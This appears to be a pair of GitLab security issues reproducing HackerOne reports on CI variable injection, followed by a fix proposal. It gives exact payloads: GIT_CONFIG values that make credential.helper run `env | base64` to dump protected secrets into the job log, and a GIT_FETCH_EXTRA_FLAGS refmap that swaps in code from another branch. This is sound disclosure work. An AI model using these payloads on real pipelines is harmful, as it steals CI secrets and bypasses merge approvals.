# Lack of filtering on GIT\_CONFIG\_\* parameters allow Developer to perform bash command injection in protected branch pipeline to disclose CI/CD variable

## Report

##### Summary

A user with the permission to run pipelines on a project (i.e. at least `developer` role with permission to merge) is able to craft CI variables to modify the git configuration, and in the end perform command injection within the context of a protected branch's pipeline (during the preliminary CI step where the branch is fetch).

It allows him to have the pipeline run on a different commit (but with the protected branch environment variables), as well as exfiltrate all the protected environment variables.

This allows the attacker to bypass any push rule or any MR approval rules that would prevent him from performing these actions otherwise. The attack is not visible in the commit history.

##### Steps to reproduce

1. The attacker must have the permission to run pipelines on the target branch. The attack mainly have an interest if MR approvals are configured and if the attacker can't self-approve his MR (which is the case in most production environments).
2. The attacker runs a pipeline with the following parameters:

   `GIT_CONFIG_COUNT`: `2`

   `GIT_CONFIG_KEY_0` : `http.proxy`

   `GIT_CONFIG_VALUE_0` : `http://jojo@localhost`

   `GIT_CONFIG_KEY_1` : `credential.helper`

   `GIT_CONFIG_VALUE_1` : `!bash -c 'env | base64 1>&2'`

Note that the `env | base64` can be replaced by any command, as the attacker wishes.

3. The attacker checks the pipeline's output and can see that the command has been executed. A base64 string is output with all the environment variables, including the protected CI variables. He can then decode the base64 string:

```
echo "[base64 string]" | tr -d "\n" | base64 -d
```

(the `tr -d "\n"` part is only useful is you copy and paste the output directly, because it contains line feeds).

##### Impact

This vulnerability allows an attacker with permission to merge to do the following actions, regardless of the MR approvals configuration set on the project:

* 1. Exfiltrate the protected CI variables.
* 2. Have the CI job run on arbitrary code by leveraging an HTTP proxy.

##### Examples

For the examples, we'll use the following simple project.

The project has a `main` branch, and merging to this branch requires two approvals from users with `maintainer` access.

The user `attacker` has a `developer` access to the project, with permission to merge. He can thus run pipelines.

The project contains a protected and masked variable called `SECRET_API_KEY`.

The repository contains the following files:

`.gitlab-ci.yml``

```
stages:
  - build
  - run

image: golang:latest

build:
  stage: build
  script:
    - go build .
  artifacts:
    paths:
      - "git-config-poc"

run-app:
  stage: run
  script:
    - ./git-config-poc
```

`main.go`

```
package main

import "fmt"

func main() {
fmt.Print("Hello")
}
```

`go.mod`

```
module git-config-poc

go 1.19
```

###### Example 1: exfiltrate the CI variables

The attacker runs a pipeline with the following parameters:

`GIT_CONFIG_COUNT`: `2`

`GIT_CONFIG_KEY_0` : `http.proxy`

`GIT_CONFIG_VALUE_0` : `http://jojo@localhost`

`GIT_CONFIG_KEY_1` : `credential.helper`

`GIT_CONFIG_VALUE_1` : `!bash -c 'env | base64 1>&2'`

The job executes the command and outputs the CI variables in base64:

The `SECRET_API_KEY` is retrieved by the attacker:

###### Example 2: replace the legitimate commit by an arbitrary one

The attackers set up a real proxy server, that truly redirect to the original repository. However, he modifies the `credential.helper` config value, so that, besides giving out the password for the proxy, it also creates a branch named after the legitimate pipeline commit. The content of this branch can be set to arbitrary code.

Given the reference precedence respected by GitLab, the

`git checkout -f -q 3059263ca9b0ec4a9d6c9a13ee050dba0ac87803`

Will checkout the malicious branch instead of checking out the commit, and all jobs will execute on arbitrary code (the job's script specified in `.gitlab-ci.yml` are not impacted though).

##### Output of checks

This bug happens on GitLab.com

#### Impact

This vulnerability allows an attacker with permission to merge to do the following actions, regardless of the MR approvals configuration set on the project:

* 1. Exfiltrate the protected CI variables.
* 2. Have the CI job run on arbitrary code by leveraging an HTTP proxy.

# Lack of filtering in GIT\_FETCH\_EXTRA\_FLAGS CI option allows Developer to run a protected pipeline from that can disclose protected CI/CD variable

⚠ **Please read [the process](https://gitlab.com/gitlab-org/release/docs/-/blob/master/general/security/developer.md) on how to fix security issues before starting to work on the issue. Vulnerabilities must be fixed in a security mirror.**

**[HackerOne report #2033561](https://hackerone.com/reports/2033561)** by `samuellg` on 2023-06-21, assigned to [@ottilia\_westerlund](/ottilia_westerlund "Ottilia Westerlund"):

[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)

## Report

##### Summary

Any user allowed to run pipelines on a branch (even a protected one) can run it with arbitrary code from another branch/commit.

##### Steps to reproduce

1. The attacker must have at least a `developer` role on the project and he must be allowed to run pipelines on protected branches (i.e. he must be able to accept Merge Requests).
2. The attacker creates a branch on the project. Let's call this branch `somebranch`. He commits arbitrary code, that will later be executed within the context of a protected branch pipeline.
3. If the target branch is `main`, the attackers note down the commit ID of the `main` branch HEAD reference. For example: `c709254daa03cda29815acf7117ed8842aecda70`.
4. The attacker runs a pipeline on the `main`branch, and add the following CI variables from the "Run pipeline" form:

   `GIT_FETCH_EXTRA_FLAGS` : `c709254daa03cda29815acf7117ed8842aecda70 --force --refmap='' somebranch:refs/heads/c709254daa03cda29815acf7117ed8842aecda70`
5. All the jobs executed in the pipelines will be executed with the code from `somebranch`instead of the code from `main`. In the example provided in the attached project, the file `somefile` is read from `somebranch` instead of from `main`.

##### Impact

Arbitrary code can be pushed to production environment. This is not visible on the attacked branch. This can also allow an attacker to steal production credentials stored within the protected CI variables.

##### Examples

Example here (this project has also been exported and attached to this report):

<https://gitlab.com/slegoff/refmap>

The branch and commit IDs are the one used in the "Steps to reproduce section".

##### What is the current *bug* behavior?

Anyone that is able to run a pipeline can choose the commit that will be checked out when running the job. The pipeline will still run within the context of the original branch (e.g. if the branch is protected, the protected variables will be available).

##### What is the expected *correct* behavior?

<https://drive.google.com/file/d/10gpKnRDItwWi9Ajn2NTQq-Mq7mSfQ_ZF/view?usp=drive_link>

When running a pipeline on a branch, we expect that jobs run with the code from that same branch, no matter which options are provided by the user.

##### Relevant logs and/or screenshots

See the attached files.

##### Output of checks

This bug happens on GitLab.com

#### Impact

The attacker can have all the pipelines job run on arbitrary code. The jobs cannot be edited through the editing of the `.gitlab-ci.yml` file though, because as far as I know this file is not parsed by the runner.

## Proposal(s)

### Option 1

* Ensure that the [runner git checkout command](https://gitlab.com/gitlab-org/gitlab-runner/blob/b523b1617695d17442d78fa2f6a7d88562ac39fa/shells/abstract.go#L477-477) always checks out by SHA, instead of inferring the branch name
